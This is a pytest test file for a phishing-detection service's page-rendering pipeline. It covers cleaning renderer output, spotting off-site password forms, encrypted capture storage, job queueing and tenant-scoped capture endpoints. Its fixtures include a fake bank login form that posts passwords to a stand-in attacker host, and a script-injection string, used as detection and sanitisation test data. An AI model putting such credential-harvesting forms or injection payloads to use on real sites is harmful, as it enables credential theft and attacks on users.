"""Step 7.3 on the API side: cleaning what the renderer sends, analysing the rendered page, storing captures (encrypted, time-limited,
tenant-scoped), queueing render jobs and applying their results."""
import base64
import json
import time
import uuid
from datetime import datetime, timedelta, timezone

import pytest
from sqlalchemy import select

from app.config import settings
from app.models import BrandCandidate, BrandPageCapture, BrandProbeJob
from app.services import brand_capture as bc
from app.services import brand_probe_analysis as pa
from app.services import brand_probe_protocol as pp
from app.services import brand_probe_queue as q
from tests.test_brand_probe_queue import KEY, NOW, _claimed, _headers, _setup, on                      # noqa: F401  (fixtures)

JPEG = b"\xff\xd8\xff\xe0" + b"fakejpegbytes" * 20
PNG = b"\x89PNG\r\n\x1a\n" + b"fakepng" * 20


def b64(b):
    return base64.b64encode(b).decode()


def raw_render(**kw):
    r = {"screenshot_b64": b64(JPEG), "title": "Acme Bank - Sign in", "text": "Welcome to Acme\nPlease sign in",
         "forms": [{"action": "https://collector.evil.example/p", "method": "POST", "inputs": ["text", "password"]}],
         "nav_chain": [{"url": "http://live.xyz/", "status": 200}], "final_url": "http://live.xyz/", "requests": 5, "blocked": 1, "timed_out": False}
    r.update(kw)
    return r


@pytest.fixture
def render_on(on, monkeypatch):                                    # noqa: F811
    monkeypatch.setattr(settings, "brand_render_enabled", True)


# ── cleaning ───────────────────────────────────────────────────────────────

def test_a_render_result_keeps_known_fields_and_flattens_text():
    r = pp.clean_render(raw_render(text="a\n\nb\tc\x00d\x1b[31m", title="T\r\nX: 1", extra="dropped"))
    assert set(r) == {"screenshot_b64", "title", "text", "forms", "nav_chain", "final_url", "requests", "blocked", "timed_out"}
    assert r["text"] == "a b c d [31m"                                         # whitespace collapsed, control characters (including ESC) gone
    assert "\n" not in r["title"] and "\r" not in r["title"] and r["forms"][0]["method"] == "post" and r["forms"][0]["inputs"] == ["text", "password"]


def test_a_screenshot_must_be_a_real_image_within_the_cap():
    assert pp.clean_render(raw_render())["screenshot_b64"] == b64(JPEG) and pp.clean_render(raw_render(screenshot_b64=b64(PNG)))["screenshot_b64"] == b64(PNG)
    for bad in (b64(b"<html><script>alert(1)</script>"), b64(b"GIF89a" + b"x" * 10), "not base64!!", 5, None, b64(JPEG + b"x" * pp.MAX_SCREENSHOT_BYTES)):
        assert pp.clean_render(raw_render(screenshot_b64=bad))["screenshot_b64"] is None


def test_render_fields_are_capped_typed_and_an_empty_render_is_none():
    r = pp.clean_render(raw_render(text="x" * (pp.MAX_RENDER_TEXT * 3), forms=[{"action": "a", "inputs": ["password"] * 100}] * 50, nav_chain=[{"url": "http://a/", "status": 200}] * 50, requests=True, blocked=-3))
    assert len(r["text"]) == pp.MAX_RENDER_TEXT and len(r["forms"]) == pp.MAX_RENDER_FORMS and len(r["forms"][0]["inputs"]) == pp.MAX_FORM_INPUTS
    assert len(r["nav_chain"]) == pp.MAX_CHAIN and r["requests"] is None and r["blocked"] is None
    assert pp.clean_render("garbage") is None and pp.clean_render({}) is None and pp.clean_render({"screenshot_b64": b64(b"nope")}) is None
    assert pp.clean_render(raw_render(forms="notalist", nav_chain=5))["forms"] == []


def test_clean_result_carries_the_render_and_a_light_result_has_none():
    assert pp.clean_result({"ok": True, "render": raw_render()})["render"]["title"] == "Acme Bank - Sign in" and pp.clean_result({"ok": True})["render"] is None


# ── analysis ───────────────────────────────────────────────────────────────

def analyse(render, **kw):
    a = dict(host="live.xyz", official_domains=["acme.com"], brand_words=["acme"])
    a.update(kw)
    return pa.analyse_render(pp.clean_render(render), **a)


def test_rendered_forms_are_read_with_their_destination_and_the_brand_is_found_in_title_and_text():
    r = analyse(raw_render())
    assert r["password_form"] and r["offsite_password_form"] and r["brand_in_title"] and r["brand_in_text"] and r["has_screenshot"]
    assert r["forms"][0]["action_host"] == "collector.evil.example" and r["forms"][0]["offsite"] is True and r["final_host"] == "live.xyz"
    assert pa.analyse_render(None, host="h", official_domains=[], brand_words=[]) is None


def test_a_form_that_posts_to_its_own_site_or_has_no_password_is_not_an_offsite_password_form():
    r = analyse(raw_render(forms=[{"action": "/login", "method": "post", "inputs": ["password"]}, {"action": "https://other.example/s", "method": "get", "inputs": ["text"]}]))
    assert r["password_form"] and not r["offsite_password_form"] and r["forms"][1]["offsite"] is True and not r["forms"][1]["password"]


def test_a_password_field_outside_any_form_counts_and_a_script_built_form_is_marked_as_found_after_scripts():
    light = {"reachable": True, "password_form": False, "offsite_password_form": False, "brand_in_title": False, "forms": []}
    rendered = analyse(raw_render(forms=[{"action": "", "method": "get", "inputs": ["password"]}], title="Hello"))
    m = pa.merge_render(light, rendered)
    assert m["password_form"] and m["form_after_scripts"] is True and m["rendered"] is rendered and m["forms"] == rendered["forms"]
    sig = {s["signal"]: s for s in pa.signals(m)}
    assert sig["page_form_after_scripts"]["weight"] == 0 and sig["page_password_form"]["weight"] == pa.W_PASSWORD_FORM
    assert light["password_form"] is False                                  # the input facts are not changed in place


def test_a_form_the_light_probe_already_saw_is_not_reported_as_script_built_and_nothing_is_lost_by_merging():
    light = {"reachable": True, "password_form": True, "offsite_password_form": True, "brand_in_title": True, "forms": [{"x": 1}], "title": "T"}
    m = pa.merge_render(light, analyse(raw_render(forms=[], title="")))
    assert m["form_after_scripts"] is False and m["offsite_password_form"] and m["brand_in_title"] and m["forms"] == [{"x": 1}]
    both = pa.merge_render(light, analyse(raw_render()))                       # both views saw a password form: not a script-built one
    assert both["password_form"] and both["form_after_scripts"] is False and not any(s["signal"] == "page_form_after_scripts" for s in pa.signals(both))
    assert pa.merge_render(light, None) == light and pa.merge_render(None, None) == {}


# ── storage ────────────────────────────────────────────────────────────────

async def _cand(db):
    _, profile, rows = await _setup(db, ("live.xyz", "monitoring", "resolving", 80))
    return profile, rows[0]


async def test_a_capture_is_encrypted_at_rest_and_round_trips(db_session):
    _, row = await _cand(db_session)
    cap = await bc.store(db_session, job_id=uuid.uuid4(), cand=row, render=pp.clean_render(raw_render()), now=NOW)
    await db_session.commit()
    assert cap.screenshot_mime == "image/jpeg" and cap.retain_until == NOW + timedelta(days=30)
    assert b64(JPEG)[:40] not in cap.screenshot_enc and "Welcome to Acme" not in cap.text_enc and cap.title == "Acme Bank - Sign in"
    assert bc.screenshot_bytes(cap) == JPEG and bc.page_text(cap) == "Welcome to Acme Please sign in"


async def test_a_tampered_or_mislabelled_capture_is_never_served(db_session):
    from app.services import crypto_service
    _, row = await _cand(db_session)
    cap = await bc.store(db_session, job_id=None, cand=row, render=pp.clean_render(raw_render()))
    cap.screenshot_enc = crypto_service.encrypt_secret(b64(b"<html>not an image</html>"))
    assert bc.screenshot_bytes(cap) is None                                    # signature no longer matches
    cap.screenshot_enc = "garbage"
    assert bc.screenshot_bytes(cap) is None and bc.page_text(cap) is not None
    cap.text_enc = "garbage"
    assert bc.page_text(cap) is None


async def test_only_the_last_three_captures_of_a_candidate_are_kept(db_session):
    _, row = await _cand(db_session)
    for i in range(5):
        await bc.store(db_session, job_id=None, cand=row, render=pp.clean_render(raw_render(title=f"t{i}")), now=NOW + timedelta(minutes=i))
    await db_session.commit()
    kept = (await db_session.execute(select(BrandPageCapture.title).where(BrandPageCapture.candidate_id == row.id).order_by(BrandPageCapture.captured_at))).scalars().all()
    assert kept == ["t2", "t3", "t4"]


async def test_purge_deletes_expired_captures_but_keeps_those_of_cases_and_unexpired_ones(db_session):
    profile, row = await _cand(db_session)
    from tests.test_brand_graph import cand as mk
    case = mk(profile, "case.xyz", status="confirmed")
    case.stage = "resolving"
    db_session.add(case)
    await db_session.commit()
    old = NOW - timedelta(days=45)
    a = await bc.store(db_session, job_id=None, cand=row, render=pp.clean_render(raw_render()), now=old)          # expired, not a case: goes
    b = await bc.store(db_session, job_id=None, cand=case, render=pp.clean_render(raw_render()), now=old)         # expired, but a case: stays
    c = await bc.store(db_session, job_id=None, cand=row, render=pp.clean_render(raw_render(title="fresh")), now=NOW)
    await db_session.commit()
    ids = {a.id, b.id, c.id}
    assert await bc.purge(db_session, NOW) == 1
    left = {x for x in (await db_session.execute(select(BrandPageCapture.id))).scalars().all()} & ids
    assert left == {b.id, c.id}


async def test_latest_is_tenant_scoped_and_hides_expired_captures_of_non_cases(db_session):
    profile, row = await _cand(db_session)
    await bc.store(db_session, job_id=None, cand=row, render=pp.clean_render(raw_render()), now=NOW)
    await db_session.commit()
    assert (await bc.latest(db_session, profile.tenant_id, row.id)).title == "Acme Bank - Sign in"
    assert await bc.latest(db_session, uuid.uuid4(), row.id) is None             # another tenant
    expired = (await db_session.execute(select(BrandPageCapture))).scalars().one()
    expired.retain_until = datetime.now(timezone.utc) - timedelta(seconds=1)
    await db_session.commit()
    assert await bc.latest(db_session, profile.tenant_id, row.id) is None        # past 30 days: gone even before the purge runs
    row.status = "confirmed"
    await db_session.commit()
    assert await bc.latest(db_session, profile.tenant_id, row.id) is not None    # ...unless it is a case


# ── queueing ───────────────────────────────────────────────────────────────

LIGHT_PW = {"reachable": True, "password_form": True, "brand_in_title": False, "favicon_matches_brand": False, "redirects_to_brand": False}


def test_what_is_worth_rendering():
    assert q.worth_rendering("monitoring", LIGHT_PW) and q.worth_rendering("confirmed", {"reachable": True}) and q.worth_rendering("monitoring", {"reachable": True, "brand_in_title": True})
    assert q.worth_rendering("monitoring", {"reachable": True, "favicon_matches_brand": True})
    assert not q.worth_rendering("monitoring", {"reachable": True})                                    # an ordinary page
    assert not q.worth_rendering("monitoring", {**LIGHT_PW, "redirects_to_brand": True})              # defensive redirect
    assert not q.worth_rendering("false_positive", LIGHT_PW) and not q.worth_rendering("confirmed", {"reachable": False}) and not q.worth_rendering("confirmed", None)


async def test_the_renderer_needs_its_own_switch_on_top_of_the_probe_switch(db_session, on, monkeypatch):    # noqa: F811
    _, row = await _cand(db_session)
    assert not q.render_enabled() and await q.enqueue_render(db_session, row, LIGHT_PW) is False
    monkeypatch.setattr(settings, "brand_render_enabled", True)
    assert q.render_enabled() and await q.enqueue_render(db_session, row, LIGHT_PW) is True
    monkeypatch.setattr(settings, "brand_probe_enabled", False)
    assert not q.render_enabled()


async def test_render_jobs_are_queued_once_per_interval_and_capped_per_tenant(db_session, render_on, monkeypatch):
    profile, row = await _cand(db_session)
    assert await q.enqueue_render(db_session, row, LIGHT_PW, NOW) is True
    await db_session.commit()
    assert await q.enqueue_render(db_session, row, LIGHT_PW, NOW) is False                             # already waiting
    job = (await db_session.execute(select(BrandProbeJob))).scalars().one()
    assert job.kind == "render" and job.host == "live.xyz"
    job.status = "done"
    await db_session.commit()
    assert await q.enqueue_render(db_session, row, LIGHT_PW, NOW + timedelta(days=1)) is False        # inside the 7-day interval
    assert await q.enqueue_render(db_session, row, LIGHT_PW, NOW + timedelta(days=settings.brand_render_host_interval_days, hours=1)) is True
    monkeypatch.setattr(settings, "brand_render_tenant_daily_cap", 1)
    await db_session.commit()
    from tests.test_brand_graph import cand as mk
    second, third = mk(profile, "second.xyz", status="monitoring"), mk(profile, "third.xyz", status="monitoring")
    db_session.add_all([second, third])
    await db_session.commit()
    later = NOW + timedelta(days=30)
    assert await q.enqueue_render(db_session, second, LIGHT_PW, later) is True                        # one render today for this tenant...
    await db_session.commit()
    assert await q.enqueue_render(db_session, third, LIGHT_PW, later) is False                        # ...and the cap of 1 stops the next
    other = (await _setup(db_session, ("o.xyz", "monitoring", "resolving", 80)))[2][0]
    assert await q.enqueue_render(db_session, other, LIGHT_PW, later) is True                         # a different tenant has its own allowance


async def test_a_render_job_is_not_handed_out_while_the_renderer_is_off_and_light_jobs_still_are(db_session, on, monkeypatch):    # noqa: F811
    profile, row = await _cand(db_session)
    r = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=row.id, host="live.xyz", kind="render", status="queued", expires_at=NOW + timedelta(days=1), created_at=NOW - timedelta(hours=1))
    light = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=row.id, host="live.xyz", kind="light", status="queued", expires_at=NOW + timedelta(days=1), created_at=NOW)
    db_session.add_all([r, light])
    await db_session.commit()
    assert (await q.claim(db_session)).kind == "light"                  # the older render job is skipped, not blocking the queue
    monkeypatch.setattr(settings, "brand_render_enabled", True)
    assert (await q.claim(db_session)).id == r.id


async def test_a_light_result_that_finds_a_login_page_queues_a_render_and_probing_intervals_ignore_render_jobs(db_session, render_on):
    profile, row = await _cand(db_session)
    job = await _claimed(db_session, profile, row)
    login = "<title>Acme - sign in</title><form action='https://collector.evil.example/x'><input type=password></form>"
    assert await q.complete(db_session, job.id, {"ok": True, "chain": [{"url": "http://live.xyz/", "status": 200}], "final_status": 200, "content_type": "text/html", "html": login}) == "ok"
    kinds = sorted(j.kind for j in (await db_session.execute(select(BrandProbeJob))).scalars().all())
    assert kinds == ["light", "render"]
    await db_session.execute(BrandProbeJob.__table__.update().where(BrandProbeJob.kind == "light").values(created_at=NOW - timedelta(days=3)))
    row.identity_score = 80                                          # (rescoring recomputed it from the made-up name; this test is about the queue)
    await db_session.commit()
    assert await q.enqueue_due(db_session, profile) == 1                # the queued render job does not stop the next light probe


async def test_nothing_is_rendered_when_the_light_probe_found_nothing_interesting(db_session, render_on):
    profile, row = await _cand(db_session)
    job = await _claimed(db_session, profile, row)
    assert await q.complete(db_session, job.id, {"ok": True, "chain": [{"url": "http://live.xyz/", "status": 200}], "final_status": 200, "content_type": "text/html", "html": "<title>Hello</title>"}) == "ok"
    assert [j.kind for j in (await db_session.execute(select(BrandProbeJob))).scalars().all()] == ["light"]


# ── applying a render result ───────────────────────────────────────────────

async def _render_job(db, profile, row):
    j = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=row.id, host="live.xyz", kind="render", status="claimed", claimed_at=NOW, expires_at=NOW + timedelta(days=1))
    db.add(j)
    await db.commit()
    return j


async def test_a_render_result_is_stored_encrypted_adds_facts_and_scores_without_keeping_the_page_text_on_the_candidate(db_session, render_on):
    profile, row = await _cand(db_session)
    row.enrichment = {"probe": {"reachable": True, "password_form": False, "forms": [], "brand_in_title": False}}
    await db_session.commit()
    job = await _render_job(db_session, profile, row)
    assert await q.complete(db_session, job.id, {"ok": True, "render": raw_render(text="SECRET_PAGE_TEXT " + "x" * 50)}) == "ok"
    await db_session.refresh(job)
    await db_session.refresh(row)
    assert job.status == "done" and job.result["rendered"]["password_form"]
    assert "SECRET_PAGE_TEXT" not in json.dumps(row.enrichment) and "SECRET_PAGE_TEXT" not in json.dumps(job.result)
    assert row.enrichment["probe"]["password_form"] and row.enrichment["probe"]["form_after_scripts"] is True
    cap = (await db_session.execute(select(BrandPageCapture))).scalars().one()
    assert "SECRET_PAGE_TEXT" in bc.page_text(cap) and cap.candidate_id == row.id
    from app.models import CandidateEvidence
    sigs = {e.signal for e in (await db_session.execute(select(CandidateEvidence).where(CandidateEvidence.candidate_id == row.id))).scalars().all()}
    assert {"page_password_form", "page_form_after_scripts"} <= sigs


async def test_a_failed_or_empty_render_is_recorded_and_stores_nothing(db_session, render_on):
    profile, row = await _cand(db_session)
    for result in ({"ok": False, "error": "render timed out"}, {"ok": True}, {"ok": True, "render": {"screenshot_b64": b64(b"<html>")}}):
        job = await _render_job(db_session, profile, row)
        assert await q.complete(db_session, job.id, result) == "ok"
        await db_session.refresh(job)
        assert job.status == "failed" and job.error
    assert (await db_session.execute(select(BrandPageCapture))).scalars().all() == []


async def test_a_render_result_is_refused_when_the_renderer_is_off_even_with_a_claimed_job(db_session, on):    # noqa: F811
    profile, row = await _cand(db_session)
    job = await _render_job(db_session, profile, row)
    assert await q.complete(db_session, job.id, {"ok": True, "render": raw_render()}) == "disabled"
    await db_session.refresh(job)
    assert job.status == "claimed"


async def test_a_new_light_probe_keeps_the_last_rendered_look(db_session, render_on):
    profile, row = await _cand(db_session)
    row.enrichment = {"probe": {"reachable": True, "forms": []}}
    await db_session.commit()
    job = await _render_job(db_session, profile, row)
    await q.complete(db_session, job.id, {"ok": True, "render": raw_render()})
    light = await _claimed(db_session, profile, row)
    await q.complete(db_session, light.id, {"ok": True, "chain": [{"url": "http://live.xyz/", "status": 200}], "final_status": 200, "content_type": "text/html", "html": "<title>Plain</title>"})
    await db_session.refresh(row)
    assert row.enrichment["probe"]["rendered"]["password_form"] and row.enrichment["probe"]["password_form"]


# ── API ────────────────────────────────────────────────────────────────────

async def test_worker_api_accepts_a_render_sized_result_but_not_an_oversized_one_and_only_hands_out_render_jobs_when_enabled(client, db_session, render_on):
    profile, row = await _cand(db_session)
    job = await _render_job(db_session, profile, row)
    path = f"/probe-worker/jobs/{job.id}/result"
    body = json.dumps({"result": {"ok": True, "render": raw_render(screenshot_b64=b64(JPEG + b"y" * 800_000))}}).encode()
    assert len(body) > pp.MAX_BODY_BYTES and (await client.post(path, content=body, headers=_headers("POST", path, body))).status_code == 204
    job2 = await _render_job(db_session, profile, row)
    path2 = f"/probe-worker/jobs/{job2.id}/result"
    huge = b'{"result": {"ok": true, "pad": "' + b"x" * (pp.MAX_RENDER_BODY_BYTES + 10) + b'"}}'
    assert (await client.post(path2, content=huge, headers=_headers("POST", path2, huge))).status_code == 413
    claim = b"{}"
    queued = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=row.id, host="live.xyz", kind="render", status="queued", expires_at=datetime.now(timezone.utc) + timedelta(days=1))
    db_session.add(queued)
    await db_session.commit()
    job_out = (await client.post("/probe-worker/claim", content=claim, headers=_headers("POST", "/probe-worker/claim", claim))).json()["job"]
    assert job_out["kind"] == "render" and set(job_out) == {"id", "host", "kind", "expires_at"}


async def test_the_capture_endpoints_serve_only_the_owning_tenant_and_only_as_an_image_or_json(auth_client, db_session):
    from tests.test_brand_guard_api import _pro_profile
    client, tenant = auth_client
    from app.models import BrandProfile
    from tests.test_brand_graph import cand as mk
    pid = await _pro_profile(client, tenant, db_session)
    profile = await db_session.get(BrandProfile, uuid.UUID(pid))
    cand = mk(profile, "live.xyz", status="monitoring")
    db_session.add(cand)
    await db_session.commit()
    none = (await client.get(f"/brand-guard/candidates/{cand.id}/capture")).json()
    assert none["available"] is False and (await client.get(f"/brand-guard/candidates/{cand.id}/capture/screenshot")).status_code == 404
    await bc.store(db_session, job_id=None, cand=cand, render=pp.clean_render(raw_render()))
    await db_session.commit()
    meta = (await client.get(f"/brand-guard/candidates/{cand.id}/capture")).json()
    assert meta["available"] and meta["has_screenshot"] and meta["title"] == "Acme Bank - Sign in" and meta["text_excerpt"].startswith("Welcome to Acme") and meta["kept_for_case"] is False
    assert "screenshot_enc" not in json.dumps(meta) and "text_enc" not in json.dumps(meta)
    img = await client.get(f"/brand-guard/candidates/{cand.id}/capture/screenshot")
    assert img.status_code == 200 and img.content == JPEG and img.headers["content-type"] == "image/jpeg"
    assert img.headers["x-content-type-options"] == "nosniff" and "no-store" in img.headers["cache-control"] and "sandbox" in img.headers["content-security-policy"]
    assert (await client.get("/brand-guard/candidates/not-a-uuid/capture")).status_code == 404
    assert (await client.get(f"/brand-guard/candidates/{uuid.uuid4()}/capture")).json()["available"] is False
